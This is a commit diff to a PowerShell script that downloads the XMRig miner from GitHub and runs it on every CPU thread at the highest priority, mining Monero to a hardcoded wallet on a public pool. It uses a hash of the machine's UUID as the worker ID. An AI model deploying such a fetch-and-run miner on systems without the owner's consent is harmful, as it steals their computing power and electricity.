230c1182278e299a713351f74bca27574a35283d
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2025-02-08 15:49:30 +0100

    Update windows.ps1

--- monero/windows.ps1
+++ monero/windows.ps1
@@ -1,15 +1,17 @@
 $algo = "rx/0"
 $pool = "gulf.moneroocean.stream:10001"
 $user = "45MBTQ27xo1LJmAi6sNFTyZhgTdoF45XCRsLUtmL7Lo376nNuxcaSxAa3JUkUV4xHEVSpsEA6nwL5S28g1fCa1RwPfXpwnH"
+$threads = (Get-CimInstance -ClassName Win32_Processor).NumberOfLogicalProcessors
 
 $uuid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID.Replace("-", "")
 $hash = (New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid))
-$numericId = [BitConverter]::ToUInt32($hash, 0) % 1000000000000
+$hexHash = [BitConverter]::ToString($hash) -replace '-'
 
-$pass = "Rig-w-$numericId"
-$threads = (Get-CimInstance -ClassName Win32_Processor).NumberOfLogicalProcessors
+$workerId = $hexHash.Substring(0, 10)
+
+$worker = "rig-w-$workerId"
 
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig.zip"
 Expand-Archive xmrig.zip
 
-.\xmrig\xmrig-6.22.2\xmrig.exe -a $algo -o $pool -u $user -p $pass --cpu-priority 5 -t $threads
+.\xmrig\xmrig-6.22.2\xmrig.exe -a $algo -o $pool -u $user -p $worker --cpu-priority 5 -t $threads
